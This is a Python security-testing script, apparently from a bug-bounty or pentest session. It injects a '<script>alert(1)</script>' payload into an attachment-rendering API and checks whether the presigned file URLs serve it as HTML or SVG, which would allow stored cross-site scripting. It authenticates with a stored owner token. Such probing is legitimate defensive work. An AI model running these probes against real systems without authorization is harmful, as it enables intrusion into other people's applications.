import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def post(path,body):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
def get(path):
    cmd=['curl','-s','-m','30',H+path,'-H','token: '+TOK,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
tag='ZXR'+uuid.uuid4().hex[:5]
print("=== renderer with .html fileName -> what Content-Type does the presigned URL serve? ===")
for ext in ['html','svg','pdf']:
    c,b=post('/api/v1/attachments/html',
       {"html":f"<h1>ZX{tag}</h1><script>alert(1)</script>","type":"word",
        "attachableType":"AuditableEntity","attachableId":"110",
        "fileName":f"zx-{tag}-{ext}"})
    print(f"\n  ext={ext}: gen -> {c} {b[:110].replace(chr(10),' ')}")
    if c!='200': continue
    aid=json.loads(b)['attachmentId']
    a=get(f'/api/v1/attachments/{aid}')['attachments'][0]
    f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
    print(f"    file={a['file_id']} name={f.get('name')} type={f.get('type')}")
    u=f.get('url') or ''
    if u:
        cmd=['curl','-s','-m','30','-i','-o','/tmp/ps','-w','%{http_code}',u]
        cc=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
        ps=open('/tmp/ps',encoding='utf-8',errors='replace').read()
        ct=[l for l in ps.splitlines() if l.lower().startswith('content-type')]
        cd=[l for l in ps.splitlines() if l.lower().startswith('content-disposition')]
        print(f"    presigned -> {cc}  {ct[0] if ct else 'no CT'}")
        print(f"    {cd[0][:100] if cd else 'no CD'}")
